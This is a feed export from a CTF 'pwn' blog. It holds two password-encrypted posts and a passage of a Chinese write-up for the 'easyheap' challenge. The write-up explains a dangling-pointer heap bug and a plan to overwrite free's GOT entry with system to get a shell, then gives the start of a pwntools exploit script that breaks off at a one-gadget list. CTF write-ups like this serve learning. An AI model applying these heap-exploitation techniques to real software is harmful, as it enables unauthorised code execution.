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 </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-27T09:24:01.123Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 